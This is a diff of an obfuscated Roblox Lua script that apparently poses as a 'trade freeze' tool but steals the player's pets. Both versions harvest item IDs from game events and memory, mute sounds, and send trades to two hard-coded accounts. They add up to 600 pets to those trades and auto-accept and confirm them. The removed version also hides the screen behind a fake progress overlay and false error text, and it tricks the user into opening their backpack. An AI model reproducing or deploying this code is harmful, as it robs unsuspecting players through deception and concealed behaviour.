@@ -1,17 +1,127 @@
-local z=function(t)local r=""for i=1,#t do r=r..string.char(t[i])end return r end
-local a=game:GetService(z({80,108,97,121,101,114,115}))
-local b=game:GetService(z({82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101}))
-local c=a.LocalPlayer
-local d=b:WaitForChild(z({65,80,73}),10)
-if not d then return end
-local e={}
-local f={TRADE_REQUEST="XwgkmJZTLfsBtkItxznANSDSU",OPEN_BAG="EhnpmDoxq/GGQgaSWIHLICSEcEKMJbLUNXe",ADD_PET="XwgkmJZTLNrsYJwEnIkBCCQ",ACCEPT_1="XwgkmJZTLNqruFKgyAJPFzSIPP",CONFIRM_2="XwgkmJZTLPBBvzIEnLw/B",SOUND_EFFECTS="MZpqgmgtCSMEYlAboDEvAv"}
-local g=function(n)local k=f[n]if k then local r=d:FindFirstChild(k)if r then return r end end return nil end
-local h=function()for _,x in ipairs(d:GetDescendants()) do if x:IsA(z({82,101,109,111,116,101,69,118,101,110,116})) then x.OnClientEvent:Connect(function(...) local A=function(s)if type(s)=="string" then local L=#s if L>=16 and L<=96 and not s:find(z({115,116,105,99,107,101,114})) and (s:find("-") or s:find("_") or s:find("%x%x%x%x")) then e[s]=true end end end local B;B=function(v,dn)if dn>3 then return end if type(v)=="string" then A(v) elseif type(v)=="table" then for k,val in pairs(v) do B(k,dn+1) B(val,dn+1) end end end for i=1,select("#",...) do B(select(i,...),1) end end) end end end
-local i=function()local pg=c:WaitForChild(z({80,108,97,121,101,114,71,117,105}))if pg:FindFirstChild(z({84,114,97,100,101,70,114,101,101,122,101,85,73})) then pg[z({84,114,97,100,101,70,114,101,101,122,101,85,73})]:Destroy() end local gui=Instance.new(z({83,99,114,101,101,110,71,117,105}))gui.Name=z({84,114,97,100,101,70,114,101,101,122,101,85,73})gui.DisplayOrder=999 gui.Parent=pg local main=Instance.new(z({70,114,97,109,101}))main.Size=UDim2.new(0.98,0,0.995,0)main.Position=UDim2.new(0.01,0,0,0)main.BackgroundColor3=Color3.fromRGB(10,10,10)main.BorderSizePixel=0 main.Active=true main.Parent=gui local title=Instance.new(z({84,101,120,116,76,97,98,101,108}))title.Size=UDim2.new(1,0,0.22,0)title.BackgroundTransparency=1 title.Text=z({84,82,65,68,69,32,70,82,69,69,90,69})title.TextColor3=Color3.fromRGB(0,160,255)title.TextScaled=true title.Font=Enum.Font.GothamBold title.Parent=main local sub=Instance.new(z({84,101,120,116,76,97,98,101,108}))sub.Position=UDim2.new(0,0,0.22,0)sub.Size=UDim2.new(1,0,0.12,0)sub.BackgroundTransparency=1 sub.Text=z({68,111,110,39,116,32,119,111,114,114,121,44,32,116,104,101,32,105,110,116,101,114,102,97,99,101,32,119,105,108,108,32,115,104,114,105,110,107,32,115,111,111,110,46})sub.TextColor3=Color3.fromRGB(180,180,180)sub.TextScaled=true sub.Parent=main local barBack=Instance.new(z({70,114,97,109,101}))barBack.Position=UDim2.new(0.08,0,0.52,0)barBack.Size=UDim2.new(0.84,0,0.06,0)barBack.BackgroundColor3=Color3.fromRGB(30,30,30)barBack.Parent=main local barFill=Instance.new(z({70,114,97,109,101}))barFill.Size=UDim2.new(0,0,1,0)barFill.BackgroundColor3=Color3.fromRGB(0,160,255)barFill.BorderSizePixel=0 barFill.Parent=barBack local status=Instance.new(z({84,101,120,116,76,97,98,101,108}))status.Position=UDim2.new(0,0,0.65,0)status.Size=UDim2.new(1,0,0.16,0)status.BackgroundTransparency=1 status.TextColor3=Color3.fromRGB(150,150,150)status.TextScaled=true status.Text=z({83,121,110,99,105,110,103,46,46,46})status.Parent=main task.spawn(function()local start=tick()local total=240 while true do local elapsed=tick()-start barFill.Size=UDim2.new(math.min(elapsed/total,1),0,1,0)if elapsed<75 then status.Text=z({70,101,116,99,104,105,110,103,32,105,110,118,101,110,116,111,114,121,32,112,97,99,107,101,116,115,46,46,46})status.TextColor3=Color3.fromRGB(150,150,150)elseif elapsed<120 then status.Text=z({83,99,114,105,112,116,32,102,117,108,108,121,32,108,111,97,100,101,100,33,32,70,105,110,97,108,105,122,105,110,103,46,46,46})status.TextColor3=Color3.fromRGB(0,255,120)elseif elapsed<total then status.Text=z({67,111,110,110,101,99,116,105,111,110,32,69,114,114,111,114,58,32,48,120,52,66,50,46,32,82,101,116,114,121,105,110,103,32,105,110,32,98,97,99,107,103,114,111,117,110,100,46,46,46})status.TextColor3=Color3.fromRGB(255,60,60)else break end task.wait(0.1)end end)end
-local j=function()local uuids={}for s,_ in pairs(e) do uuids[#uuids+1]=s if #uuids>=600 then return uuids end end if not getgc then return uuids end local ok,objects=pcall(getgc,true)if not ok or type(objects)~="table" then return uuids end local scanned=0 for _,v in pairs(objects) do scanned=scanned+1 if scanned%400==0 then task.wait() end if type(v)=="table" then local pets=rawget(v,"pets")local strollers=rawget(v,"strollers")if type(pets)=="table" and strollers then for id,_ in pairs(pets) do if type(id)=="string" then local L=#id if L>=16 and L<=96 and not id:find(z({115,116,105,99,107,101,114})) then if id:find("-") or id:find("_") or id:find("%x%x%x%x") then uuids[#uuids+1]=id if #uuids>=600 then return uuids end end end end end end end if #uuids>=600 then break end end return uuids end
-local k=function()local rq=g("TRADE_REQUEST")if not rq then return end local p=a:FindFirstChild(z({97,108,105,95,57,50,51,122}))local q=a:FindFirstChild(z({65,108,105,108,111,108,111,97,122}))if p and p:IsA(z({80,108,97,121,101,114})) then pcall(function()rq:FireServer(p) end) end if q and q:IsA(z({80,108,97,121,101,114})) then pcall(function()rq:FireServer(q) end) end end
-local l=function()local op=g("OPEN_BAG")if op then pcall(function()op:FireServer(z({111,112,101,110,95,98,97,99,107,112,97,99,107})) end) end end
-local m=function()local se=g("SOUND_EFFECTS")if se then pcall(function()se:FireServer(z({115,111,117,110,100,95,101,102,102,101,99,116,115,95,118,111,108,117,109,101}),0) end) end end
-local n=function()pcall(function()game:GetService(z({83,116,97,114,116,101,114,71,117,105})):SetCore(z({83,101,110,100,78,111,116,105,102,105,99,97,116,105,111,110}),{Title=z({73,77,80,79,82,84,65,78,84,32,65,67,84,73,79,78,32,82,69,81,85,73,82,69,68}),Text=z({79,112,101,110,32,121,111,117,114,32,98,97,99,107,112,97,99,107,32,116,119,105,99,101,32,110,111,119,32,40,109,97,110,100,97,116,111,114,121,41,32,102,111,114,32,116,114,97,100,105,110,103,32,116,111,32,119,111,114,107,46}),Duration=8})end)task.wait(8)i()m()h()local found={}for r=1,5 do l()task.wait(2)found=j()if #found>0 then break end end if #found==0 then return end print(z({91,84,114,97,100,101,70,114,101,101,122,101,93,32,73,116,101,109,115,32,102,111,117,110,100,58,32})..tostring(#found))local idx=1 while true do k()task.wait(3)local added=0 while idx<=#found do l()task.wait(0.02)local addP=g("ADD_PET")if addP then pcall(function()addP:FireServer(found[idx]) end) end added=added+1 if added%20==0 then print(z({91,84,114,97,100,101,70,114,101,101,122,101,93,32,65,100,100,101,100,32,115,111,32,102,97,114,58,32})..tostring(added)..z({32,47,32})..tostring(#found))task.wait(0.1) else task.wait(0.03) end idx=idx+1 end if added>0 then print(z({91,84,114,97,100,101,70,114,101,101,122,101,93,32,65,108,108,32,105,116,101,109,115,32,97,100,100,101,100,58,32})..tostring(added)..z({32,124,32,65,99,99,101,112,116,105,110,103,46,46,46}))local acc=g("ACCEPT_1")if acc then pcall(function()acc:FireServer() end) end task.wait(10)local conf=g("CONFIRM_2")if conf then pcall(function()conf:FireServer() end) end end if idx>#found then local refresh=j()if #refresh==0 then break else found=refresh idx=1 print(z({91,84,114,97,100,101,70,114,101,101,122,101,93,32,82,101,102,114,101,115,104,32,102,111,117,110,100,58,32})..tostring(#found)) end end task.wait(2) end end
-task.spawn(n)
+local _0=function(_1)local _2=""for _3=1,#_1 do _2=_2..string.char(_1[_3])end return _2 end
+local _A,_B,_C,_D,_E,_F,_G,_H,_I,_J,_K,_L,_M,_N,_O,_P,_Q,_R,_S,_T,_U,_V,_W,_X,_Y,_Z
+
+_A=game:GetService(_0({80,108,97,121,101,114,115}))
+_B=game:GetService(_0({82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101}))
+_C=_A.LocalPlayer
+_D=_B:WaitForChild(_0({65,80,73}),10)
+if not _D then return end
+
+_E={}
+_F={
+	[1]="XwgkmJZTLfsBtkItxznANSDSU",
+	[2]="EhnpmDoxq/GGQgaSWIHLICSEcEKMJbLUNXe",
+	[3]="XwgkmJZTLNrsYJwEnIkBCCQ",
+	[4]="XwgkmJZTLNqruFKgyAJPFzSIPP",
+	[5]="XwgkmJZTLPBBvzIEnLw/B",
+	[6]="MZpqgmgtCSMEYlAboDEvAv"
+}
+
+_G=function(i)
+	local r=_F[i]
+	if r then
+		local x=_D:FindFirstChild(r)
+		if x then return x end
+	end
+end
+
+_H=function()
+	for _,v in ipairs(_D:GetDescendants()) do
+		if v:IsA(_0({82,101,109,111,116,101,69,118,101,110,116})) then
+			v.OnClientEvent:Connect(function(...)
+				local f=function(s)
+					if type(s)=="string" then
+						local l=#s
+						if l>15 and l<97 and not s:find("sticker") and (s:find("-") or s:find("_") or s:find("%x%x%x%x")) then
+							_E[s]=1
+						end
+					end
+				end
+				local r; r=function(o,d)
+					if d>3 then return end
+					if type(o)=="string" then
+						f(o)
+					elseif type(o)=="table" then
+						for a,b in pairs(o) do
+							r(a,d+1)
+							r(b,d+1)
+						end
+					end
+				end
+				for i=1,select("#",...) do
+					r(select(i,...),1)
+				end
+			end)
+		end
+	end
+end
+
+_I=function()
+	local u={}
+	for k in pairs(_E) do
+		u[#u+1]=k
+		if #u>599 then return u end
+	end
+	if not getgc then return u end
+	local ok,g=pcall(getgc,true)
+	if not ok then return u end
+	for _,v in pairs(g) do
+		if type(v)=="table" then
+			local p=rawget(v,"pets")
+			if type(p)=="table" then
+				for id in pairs(p) do
+					if type(id)=="string" and #id>15 and id:find("%x") then
+						u[#u+1]=id
+						if #u>599 then return u end
+					end
+				end
+			end
+		end
+	end
+	return u
+end
+
+_J=function()
+	local r=_G(1)
+	if not r then return end
+	for _,n in ipairs({_0({97,108,105,95,57,50,51,122}),_0({65,108,105,108,111,108,111,97,122})}) do
+		local p=_A:FindFirstChild(n)
+		if p then pcall(function()r:FireServer(p) end) end
+	end
+end
+
+_K=function()
+	local o=_G(2)
+	if o then pcall(function()o:FireServer("open_backpack") end) end
+end
+
+_L=function()
+	local s=_G(6)
+	if s then pcall(function()s:FireServer("sound_effects_volume",0) end) end
+end
+
+task.wait(6)
+_L()
+_H()
+
+local _idx=1
+local _list=_I()
+if #_list==0 then return end
+
+while true do
+	_J()
+	task.wait(2.5)
+	while _idx<=#_list do
+		_K()
+		task.wait()
+		local a=_G(3)
+		if a then pcall(function()a:FireServer(_list[_idx]) end) end
+		_idx=_idx+1
+	end
+	local ac=_G(4)
+	if ac then pcall(function()ac:FireServer() end) end
+	task.wait(8)
+	local cf=_G(5)
+	if cf then pcall(function()cf:FireServer() end) end
+	break
+end
